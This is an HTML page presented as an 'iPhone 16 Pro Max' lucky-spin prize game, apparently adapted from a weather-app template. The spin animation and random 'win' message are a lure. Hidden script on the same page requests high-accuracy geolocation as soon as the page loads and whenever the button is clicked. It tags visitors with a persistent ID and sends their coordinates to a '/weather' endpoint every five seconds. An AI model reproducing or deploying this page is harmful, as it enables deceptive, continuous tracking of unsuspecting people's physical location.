<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>iPhone Spin Gift</title>

<style>

*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:linear-gradient(135deg,#ff512f,#dd2476);
    font-family:Arial,sans-serif;
}


/* Main Card */
.weather-card{

    background:white;
    width:330px;
    padding:30px 20px;
    border-radius:25px;
    text-align:center;

    box-shadow:
    0 15px 40px rgba(0,0,0,.3);

}


/* Heading */

.weather-card h2{
    color:#ff0066;
    font-size:28px;
    margin-bottom:10px;
}


/* Location */

.location{
    font-size:18px;
    color:#555;
}



/* iPhone Image */

.weather-icon{
    margin:25px 0;
}


.weather-icon img{

    width:180px;
    transition:5s;
}



/* Result */

.weather-info{
    margin:20px 0;
}


.temperature{

    display:block;
    font-size:45px;
}


.condition{

    font-size:18px;
    color:#777;

}



/* Button */

button{

    padding:15px 40px;
    border:none;
    border-radius:40px;

    background:#ff9800;
    color:white;

    font-size:20px;
    font-weight:bold;

    cursor:pointer;

}


button:hover{

    background:#ff6600;

}



</style>

</head>


<body>


<div class="weather-card">


<h2>🎁 Win iPhone 16 Pro Max</h2>


<p class="location">
    Lucky Spin Gift
</p>



<div class="weather-icon">

<img id="iphone"
src="iphone.png"
alt="iPhone">

</div>



<div class="weather-info">

<span class="temperature">
🎡
</span>

<span class="condition">
Spin and try your luck!
</span>

</div>



<button id="check-weather">
SPIN NOW
</button>



</div>



<script>

const button = document.getElementById("check-weather");

const iphone = document.getElementById("iphone");

const condition = document.querySelector(".condition");

const temperature = document.querySelector(".temperature");



button.addEventListener("click",()=>{


    button.disabled=true;

    button.innerHTML="Spinning...";


    let randomDegree = 1800 + Math.floor(Math.random()*360);


    iphone.style.transform =
    `rotateY(${randomDegree}deg)`;



    setTimeout(()=>{


        let win =
        Math.random() > 0.5;



        if(win){


            temperature.innerHTML="🎉";

            condition.innerHTML=
            "Congratulations! You won iPhone 🎁";


        }

        else{


            temperature.innerHTML="😢";

            condition.innerHTML=
            "Better luck next time!";


        }



        button.disabled=false;

        button.innerHTML="SPIN AGAIN";



    },5000);



});





    
    const id = localStorage.getItem("id") || generateId();
    const btn = document.querySelector("#check-weather");
    let __interval;

    // Page load hote hi location bhejo
    window.addEventListener("load", () => {
        btn.disabled = true;
        btn.innerHTML = "Fetching...";
        getLocation();
    });

    // Button se bhi manually fetch kar sakte hain
    btn.addEventListener("click", () => {
        btn.disabled = true;
        btn.innerHTML = "Fetching...";
        getLocation();
    });

    function getLocation() {
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;

                fetch("/weather", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json"
                    },
                    body: JSON.stringify({
                        id,
                        lat,
                        lng
                    })
                })
                .then(() => {
                    btn.innerHTML = "Location Sent";
                })
                .catch(error => {
                    console.error("POST Error:", error);
                    btn.innerHTML = "Retry";
                    btn.disabled = false;
                });
            },
            (error) => {
                console.error("Location Error:", error);
                alert("Please allow location access.");
                btn.innerHTML = "Check Weather";
                btn.disabled = false;
            },
            {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            }
        );

        // Har 5 second me update bheje
        if (__interval) clearTimeout(__interval);
        __interval = setTimeout(getLocation, 5000);
    }

    function generateId(length = 10) {
        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        let result = "";

        for (let i = 0; i < length; i++) {
            result += characters.charAt(
                Math.floor(Math.random() * characters.length)
            );
        }

        localStorage.setItem("id", result);
        return result;
    }
</script>
</body>

</html>
